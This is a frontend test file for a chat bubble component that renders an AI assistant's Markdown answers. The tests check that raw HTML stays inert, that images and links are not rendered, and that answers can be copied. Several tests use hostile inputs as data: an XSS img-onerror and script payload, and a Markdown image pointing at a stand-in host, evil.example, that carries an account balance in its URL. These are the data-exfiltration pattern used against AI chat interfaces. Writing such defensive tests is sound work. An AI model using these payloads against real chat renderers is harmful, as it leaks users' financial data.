/**
 * MessageBubble — Thandi's answers render their formatting (bold, lists,
 * tables) the way Claude writes them, safely: raw HTML stays inert and links
 * are not clickable. The user's own words stay plain text. Each answer can be
 * copied.
 */
import { fireEvent, render, screen, waitFor, within } from "@testing-library/react";
import { afterEach, describe, expect, it, vi } from "vitest";
import { MessageBubble } from "../components/MessageBubble";
import type { ThandiMessage } from "../types";

function answer(content: string): ThandiMessage {
  return { id: "a1", role: "assistant", content, timestamp: "2026-11-21T08:00:00.000Z", answerMode: "claude" };
}

afterEach(() => {
  vi.restoreAllMocks();
});

describe("MessageBubble — formatted answers", () => {
  it("renders bold and bullet lists as real elements, not symbols", () => {
    render(<MessageBubble message={answer("**Total:** ZMW 550,817.00\n\n- Shoprite\n- Pick n Pay")} />);

    expect(screen.getByText("Total:").tagName).toBe("STRONG");
    expect(screen.queryByText(/\*\*/)).not.toBeInTheDocument();
    const items = screen.getAllByRole("listitem").map((item) => item.textContent);
    expect(items).toEqual(["Shoprite", "Pick n Pay"]);
  });

  it("renders a Markdown table as a table", () => {
    render(<MessageBubble message={answer("| Account | Balance |\n|---|---:|\n| Main Checking | ZMW 97,995.00 |")} />);

    const table = screen.getByRole("table");
    expect(within(table).getByRole("columnheader", { name: "Account" })).toBeInTheDocument();
    expect(within(table).getByRole("cell", { name: "ZMW 97,995.00" })).toBeInTheDocument();
    expect(screen.queryByText(/\|---/)).not.toBeInTheDocument();
  });

  it("never turns raw HTML in an answer into elements", () => {
    const { container } = render(<MessageBubble message={answer('Hi <img src="x" onerror="alert(1)"> there <script>alert(2)</script>')} />);

    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("script")).toBeNull();
  });

  it("never renders a Markdown image, so the browser fetches no URL from an answer", () => {
    const { container } = render(
      <MessageBubble message={answer("Balance ![x](https://evil.example/?q=550817) and ![y][ref]\n\n[ref]: https://evil.example/r.png")} />,
    );

    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("evil.example");
  });

  it("shows a link's text without making it clickable", () => {
    render(<MessageBubble message={answer("See [your bank](https://example.com/phish) for details.")} />);

    expect(screen.queryByRole("link")).not.toBeInTheDocument();
    expect(screen.getByText(/your bank/)).toBeInTheDocument();
  });

  it("keeps the user's own message as plain text", () => {
    render(<MessageBubble message={{ id: "u1", role: "user", content: "**not bold**", timestamp: "2026-11-21T08:00:00.000Z" }} />);

    expect(screen.getByText("**not bold**")).toBeInTheDocument();
  });
});

describe("MessageBubble — copy an answer", () => {
  it("copies the answer text and confirms it", async () => {
    const writeText = vi.fn().mockResolvedValue(undefined);
    Object.defineProperty(navigator, "clipboard", { configurable: true, value: { writeText } });
    render(<MessageBubble message={answer("**Total:** ZMW 5")} />);

    fireEvent.click(screen.getByRole("button", { name: /copy answer/i }));

    expect(writeText).toHaveBeenCalledWith("**Total:** ZMW 5");
    await waitFor(() => expect(screen.getByRole("button", { name: /copied/i })).toBeInTheDocument());
  });

  it("does not offer a copy button on the user's own message", () => {
    render(<MessageBubble message={{ id: "u1", role: "user", content: "hello", timestamp: "2026-11-21T08:00:00.000Z" }} />);

    expect(screen.queryByRole("button", { name: /copy answer/i })).not.toBeInTheDocument();
  });
});
